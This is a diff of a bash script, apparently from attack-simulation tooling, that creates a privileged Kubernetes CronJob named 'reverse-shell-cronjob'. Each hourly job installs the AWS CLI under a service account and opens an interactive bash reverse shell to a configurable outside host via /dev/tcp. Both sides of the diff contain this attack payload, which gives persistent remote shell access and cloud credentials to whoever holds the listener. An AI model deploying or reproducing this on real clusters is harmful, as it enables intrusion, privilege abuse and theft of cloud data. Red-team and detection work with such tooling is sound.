@@ -172,34 +172,46 @@ log "creating cronjob file..."
 # Delete the existing CronJob if it exists
 kubectl delete cronjob reverse-shell-cronjob --namespace=s3app --ignore-not-found 2>&1 | tee -a $LOGFILE
 
-# Create the new CronJob and save the JSON output
-kubectl create cronjob reverse-shell-cronjob \
-  --namespace=s3app \
-  --schedule="15 */1 * * *" \
-  --image=ubuntu \
-  --dry-run=client -o json 2>&1 | tee -a $LOGFILE | tee reverse-shell-cronjob.json
+# now we setup a cronjob to create a pod running the service account
+log "creating cronjob file..."
+cat <<EOF > /tmp/kubernetes_prod_cronjob.yaml
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  namespace: s3app
+  name: reverse-shell-cronjob
+spec:
+  schedule: "15 */1 * * *"
+  concurrencyPolicy: Forbid
+  jobTemplate:
+    spec:
+      activeDeadlineSeconds: 3600
+      ttlSecondsAfterFinished: 120
+      template:
+        spec:
+          serviceAccountName: $SERVICE_ACCOUNT
+          containers:
+          - name: ubuntu
+            image: ubuntu
+            env:
+            - name: BUCKET_NAME
+              value: "$(echo -n $NEW_BUCKET_NAME | base64 -d)"
+            - name: REVERSE_SHELL_HOST
+              value: "$REVERSE_SHELL_HOST"
+            - name: REVERSE_SHELL_PORT
+              value: "$REVERSE_SHELL_PORT"
+            command: [
+                "/bin/bash", 
+                "-c", 
+                "apt-get update && apt-get install -y curl unzip python3-pip && curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\" && unzip awscliv2.zip && ./aws/install && TASK=kube2s3 /bin/bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1"]
+            securityContext:
+              privileged: true
+          restartPolicy: OnFailure
+EOF
 
-# Update the JSON to include the concurrency policy
-jq '.spec.concurrencyPolicy = "Forbid" |
-    .spec.jobTemplate.spec.activeDeadlineSeconds = 3600 |
-    .spec.jobTemplate.spec.ttlSecondsAfterFinished = 120 |
-    .spec.jobTemplate.spec.template.spec.restartPolicy = "OnFailure" |
-    .spec.jobTemplate.spec.template.spec.serviceAccountName = $SERVICE_ACCOUNT |
-    .spec.jobTemplate.spec.template.spec.containers[0].command = ["/bin/bash", "-c"] |
-    .spec.jobTemplate.spec.template.spec.containers[0].args = ["apt-get update && apt-get install -y curl unzip python3-pip && curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\" && unzip awscliv2.zip && ./aws/install && TASK=kube2s3 /bin/bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1"] |
-    .spec.jobTemplate.spec.template.spec.containers[0].env += [
-      {"name": "BUCKET_NAME", "value": $NEW_BUCKET_NAME},
-      {"name": "REVERSE_SHELL_HOST", "value": $REVERSE_SHELL_HOST},
-      {"name": "REVERSE_SHELL_PORT", "value": $REVERSE_SHELL_PORT}
-    ] |
-    .spec.jobTemplate.spec.template.spec.containers[0].securityContext.privileged = true' \
-  --arg SERVICE_ACCOUNT "$SERVICE_ACCOUNT" \
-  --arg NEW_BUCKET_NAME "$NEW_BUCKET_NAME" \
-  --arg REVERSE_SHELL_HOST "$REVERSE_SHELL_HOST" \
-  --arg REVERSE_SHELL_PORT "$REVERSE_SHELL_PORT" \
-  reverse-shell-cronjob.json | tee -a $LOGFILE | tee tmp.json && mv tmp.json reverse-shell-cronjob.json
+cat /tmp/kubernetes_prod_cronjob.yaml 2>&1 | tee -a $LOGFILE
 
-# Apply the updated CronJob configuration
-kubectl apply -f reverse-shell-cronjob.json 2>&1 | tee -a $LOGFILE
+log "starting cronjob..."
+kubectl_proxy apply -f /tmp/kubernetes_prod_cronjob.yaml 2>&1 | tee -a $LOGFILE
 
 log "done."
